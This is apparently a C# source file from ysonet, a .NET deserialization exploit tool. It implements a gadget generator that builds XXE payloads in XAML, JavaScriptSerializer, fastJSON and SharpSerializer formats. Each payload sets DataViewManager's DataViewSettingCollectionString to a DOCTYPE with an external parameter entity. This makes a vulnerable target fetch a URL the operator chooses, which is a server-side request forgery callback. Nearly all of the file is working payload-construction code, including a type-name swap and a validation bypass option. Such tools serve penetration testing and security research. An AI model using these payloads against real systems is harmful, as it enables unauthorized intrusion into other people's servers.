using NDesk.Options;
using System.Collections.Generic;
using ysonet.Helpers;

namespace ysonet.Generators
{
    /// <summary>
    /// System.Data.DataViewManager.DataViewSettingCollectionString parses its value with a
    /// legacy XmlTextReader. On a target that still uses the pre-4.5.2 XML defaults that
    /// reader carries a real XmlUrlResolver, so a DOCTYPE with an external parameter entity
    /// makes the deserializing process fetch a URL the operator chooses.
    ///
    /// "Pre-4.5.2" is a property of the target APPLICATION (the framework it was compiled
    /// against), not of the framework installed on the machine. A fully patched box runs
    /// this all day if the app it hosts was built against 4.5.1 - which is why the declared
    /// version span ends at 4.5.1, and why -t on this tool (which targets 4.7.2) can never
    /// fetch anything.
    ///
    /// The effect is a network request made by the target (SSRF / callback). It is NOT file
    /// disclosure: the setter reads elements and attributes only, never entity text, and it
    /// returns nothing to the sender.
    /// </summary>
    public class DataViewManagerXxeGenerator : GenericGenerator
    {
        // Canonical long name of the escape hatch, so the generator, its help and the tests
        // cannot drift apart.
        public const string RawInputOptionName = "rawinput";

        // Shown in the empty-input refusal and in the option help.
        public const string ExampleUrl = "http://127.0.0.1:8080/x.dtd";

        private bool rawInput;


        // The effect proven by the tests is one outbound request from the target, so the
        // kind is network. Information disclosure is deliberately NOT declared: an external
        // DTD fetch proves SSRF, and nothing in this chain returns file content to the
        // sender.
        //
        // The version axis describes the TARGET, and here the deciding number is the
        // framework the target APPLICATION was BUILT against, not the one installed on the
        // machine it runs on. XmlReaderSettings.EnableLegacyXmlSettings() reads the entry
        // assembly's TargetFrameworkAttribute once per process: below 4.5.2 the legacy
        // XmlTextReader gets a real XmlUrlResolver and fetches, 4.5.2 and above gets null
        // and fetches nothing. So the span ends at 4.5.1, the last version below that
        // change, and starts at 4.0, the CLR generation this tool targets.
        //
        // That is why the installed runtime is irrelevant, and it is measured, not assumed:
        // the FULL suite fires this in a child stamped 4.5.1 and asserts an otherwise
        // identical child stamped 4.7.2 fetches nothing - both on whatever modern build the
        // run happens to be on. The OTHER way in, a machine where the EnableLegacyXmlSettings
        // switch is turned back on, is not a version at all and stays in AdditionalInfo().
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.Network)
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx451))
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework);
        }

        // The XXE-setter technique class is theirs (Friday the 13th: JSON Attacks, Black Hat
        // USA 2017). The DataViewManager carrier itself was found by this project's .NET
        // framework graph research.
        public override string Finders()
        {
            return "Oleksandr Mirosh, Alvaro Munoz";
        }

        public override string Contributors()
        {
            return "Soroush Dalili";
        }

        public override string AdditionalInfo()
        {
            return "Sets DataViewSettingCollectionString so the target's legacy XmlTextReader fetches an external DTD. Only fires when the target app uses pre-4.5.2 XML resolver defaults.";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Independent };
        }

        // Every formatter here calls the PROPERTY SETTER by name. That is the whole
        // requirement, and it is also why the list is short: DataViewManager implements
        // IList, so a serializer that infers a contract (Json.NET, YamlDotNet,
        // DataContractSerializer, NetDataContractSerializer, XmlSerializer,
        // DataContractJsonSerializer, MessagePack typeless) builds a COLLECTION contract and
        // never touches the property. The field-based formatters (BinaryFormatter,
        // SoapFormatter, LosFormatter, FsPickler) cannot work either: they restore state
        // without calling a setter, and DataViewManager is not even [Serializable].
        public override List<string> SupportedFormatters()
        {
            return new List<string>
            {
                Formatters.Xaml,
                Formatters.JavaScriptSerializer,
                Formatters.FastJson,
                Formatters.SharpSerializerXml,
                Formatters.SharpSerializerBinary
            };
        }

        public override CommandInputType CommandInput()
        {
            return CommandInputType.Url;
        }

        public override OptionSet Options()
        {
            // Not RawInputOption(): that shared help says formatter-layer escaping is turned
            // off, which is NOT what happens here. The finished XML is always escaped for the
            // outer payload; --rawinput only skips the check on the URL itself.
            return new OptionSet
            {
                {
                    RawInputOptionName,
                    "Skip the URL validation and put -c into the DTD external identifier exactly "
                        + "as typed, with no trimming. Normal mode accepts an absolute http or "
                        + "https URL and refuses whitespace, control characters and the "
                        + "characters \" < > \\, because the value goes inside a QUOTED DTD "
                        + "external identifier and those would corrupt or escape it. Use this "
                        + "only for research on a resolver that accepts something else; the "
                        + "network effect this gadget declares was proven with http(s). It does "
                        + "NOT turn off the outer formatter's escaping, so the payload is still "
                        + "a valid document - but nothing checks that the identifier inside it "
                        + "still is, and a broken one simply fetches nothing.",
                    v => { if (v != null) rawInput = true; }
                },
            };
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            string url = rawInput
                ? DtdSystemLiteral.RequireRawValue(inputArgs == null ? null : inputArgs.Cmd, Name())
                : DtdSystemLiteral.ValidateHttpUrl(inputArgs == null ? null : inputArgs.Cmd, Name(), ExampleUrl);
            object payload = FinishHandWrittenPayload(BuildPayload(url, formatter), formatter, inputArgs);

            // On -t with no request, explain that this 4.7.2 build hands its legacy
            // XmlTextReader a null resolver, so the fetch had nothing to resolve with - the
            // correct result, not a broken payload. Only printed when -t is used and only
            // when this process would not have fetched.
            if (inputArgs != null && inputArgs.Test)
            {
                string note = Helpers.Core.LegacyXmlDefaults.SelfTestCannotFetchNote(Name());
                if (note != null)
                    System.Console.Error.WriteLine(note);
            }

            return payload;
        }

        // The two spellings of the carrier's name: the assembly qualified form the JSON-family
        // serializers and the MessagePack/SharpSerializer type swaps need, and the space-free
        // form the hand written SharpSerializer XML document uses.
        private const string DataViewManagerAssemblyQualifiedName =
            "System.Data.DataViewManager, System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";

        private const string DataViewManagerShortName =
            "System.Data.DataViewManager,System.Data,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089";

        /// <summary>
        /// The XML the DataViewSettingCollectionString setter parses. The setter builds an
        /// XmlTextReader over this string and calls Read(), which parses the DOCTYPE before
        /// it validates the root name, so the external parameter entity is fetched first.
        ///
        /// The DOCTYPE name is the root name the setter expects, so the setter does not even
        /// throw afterwards.
        /// </summary>
        internal static string XxeXml(string dtdUrl)
        {
            return "<!DOCTYPE DataViewSettingCollectionString ["
                 + "<!ENTITY % remote SYSTEM \"" + dtdUrl + "\">"
                 + "%remote;"
                 + "]><DataViewSettingCollectionString/>";
        }

        // Every formatter here sets ONE property by name. The finished XML is ALWAYS escaped
        // for the outer document, --rawinput or not: that switch only decides whether the URL
        // itself was checked, never whether the payload around it is well formed.
        private object BuildPayload(string url, string formatter)
        {
            string xml = XxeXml(url);

            if (IsFormatter(formatter, Formatters.Xaml))
            {
                return @"<DataViewManager DataViewSettingCollectionString=""" + EscapeForXmlAttribute(xml, false) + @""" xmlns=""clr-namespace:System.Data;assembly=System.Data"" />";
            }

            // Both JSON templates below quote with DOUBLE quotes, so they escape with
            // EscapeForJsonDoubleQuoted (only \ and "). EscapeForJson would also write an
            // apostrophe as \', which is not a legal JSON escape: fastJSON DROPS the
            // character, and the URL would reach the target with the apostrophe missing.
            if (IsFormatter(formatter, Formatters.JavaScriptSerializer))
            {
                return @"
{
    ""__type"":""" + DataViewManagerAssemblyQualifiedName + @""",
    ""DataViewSettingCollectionString"":""" + EscapeForJsonDoubleQuoted(xml, false) + @"""
}";
            }

            if (IsFormatter(formatter, Formatters.FastJson))
            {
                return @"
{
    ""$types"":{
        """ + DataViewManagerAssemblyQualifiedName + @""":""1""
    },
    ""$type"":""1"",
    ""DataViewSettingCollectionString"":""" + EscapeForJsonDoubleQuoted(xml, false) + @"""
}";
            }

            if (IsFormatter(formatter, Formatters.SharpSerializerXml))
            {
                return @"
<Complex type=""" + DataViewManagerShortName + @""">
    <Properties>
        <Simple name=""DataViewSettingCollectionString"" value=""" + EscapeForXmlAttribute(xml, false) + @"""/>
    </Properties>
</Complex>";
            }

            if (IsFormatter(formatter, Formatters.SharpSerializerBinary))
            {
                // No document to hand write here, and constructing the real DataViewManager
                // would fire the payload inside ysonet, so serialize the surrogate below and
                // swap the type name in the stream.
                return SharpSerializerTypeSwap.SerializeAs(
                    new DataViewManagerSurrogate { DataViewSettingCollectionString = xml },
                    DataViewManagerAssemblyQualifiedName);
            }

            throw UnsupportedFormatter(formatter);
        }

        // Shape only: the property name is what SharpSerializer writes into the binary
        // stream. Never deserialized as itself - SharpSerializerTypeSwap rewrites the type
        // name to System.Data.DataViewManager before the payload leaves ysonet.
        internal sealed class DataViewManagerSurrogate
        {
            public string DataViewSettingCollectionString { get; set; }
        }

        // The URL check lives in Helpers/Input/DtdSystemLiteral, because it is mechanics
        // shared with the other external-DTD gadget and names no gadget of its own. What
        // stays here is the payload: the DOCTYPE template above.
    }
}
